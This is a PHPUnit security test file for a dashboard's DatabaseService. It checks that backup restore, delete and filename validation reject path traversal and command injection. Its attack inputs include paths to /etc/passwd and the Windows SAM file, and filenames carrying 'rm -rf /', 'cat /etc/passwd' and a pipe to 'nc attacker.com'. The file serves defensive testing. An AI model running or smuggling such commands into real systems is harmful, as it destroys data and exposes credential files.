<?php

declare(strict_types=1);

namespace Tests\DevDashboard\Services;

use DevDashboard\Services\DatabaseService;
use PHPUnit\Framework\TestCase;
use ReflectionClass;

/**
 * Security tests for DatabaseService
 *
 * @covers \DevDashboard\Services\DatabaseService
 */
class DatabaseServiceSecurityTest extends TestCase
{
    private DatabaseService $service;

    protected function setUp(): void
    {
        parent::setUp();
        require_once __DIR__ . '/../../../../src/php/DevDashboard/Services/DatabaseService.php';
        require_once __DIR__ . '/../../../../src/php/App/Infrastructure/DatabaseConfig.php';

        // Set minimal database config for testing (if not already set)
        if (!getenv('DB_PASSWORD') && !getenv('DB_PASSWORD_FILE')) {
            putenv('DB_PASSWORD=test_password');
        }

        if (!getenv('DATABASE_URL')) {
            putenv('DATABASE_URL=postgres://test:test@localhost:5432/test');
        }

        $this->service = new DatabaseService();
    }

    /**
     * Helper: Get private/protected method via reflection
     *
     * @param array<int, mixed> $args
     */
    private function callPrivateMethod(object $object, string $methodName, array $args = []): mixed
    {
        $reflection = new ReflectionClass($object);
        $method     = $reflection->getMethod($methodName);
        return $method->invokeArgs($object, $args);
    }

    public function testSecurityPathTraversalIsBlocked(): void
    {
        $attackVectors = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/var/www/html/secrets/db_password.txt',
            'backup.sql.gz/../../../etc/passwd',
        ];

        foreach ($attackVectors as $vector) {
            // Test restore
            $result = $this->service->restoreBackup($vector);
            $this->assertFalse($result['success'], 'Restore should block: ' . $vector);

            // Test delete
            $result = $this->service->deleteBackup($vector);
            $this->assertFalse($result['success'], 'Delete should block: ' . $vector);
        }
    }

    public function testSecurityCommandInjectionIsBlocked(): void
    {
        // Attempt command injection via filename
        $attackFilenames = [
            'postgres_app_20260126_120530.sql.gz; rm -rf /',
            'postgres_app_20260126_120530.sql.gz && cat /etc/passwd',
            'postgres_app_20260126_120530.sql.gz | nc attacker.com 1234',
            'postgres_app_$(whoami)_20260126_120530.sql.gz',
        ];

        foreach ($attackFilenames as $filename) {
            // Validation should reject these patterns
            $result = $this->callPrivateMethod($this->service, 'validateBackupFilename', [$filename]);
            $this->assertFalse($result, 'Should reject command injection: ' . $filename);
        }
    }
}
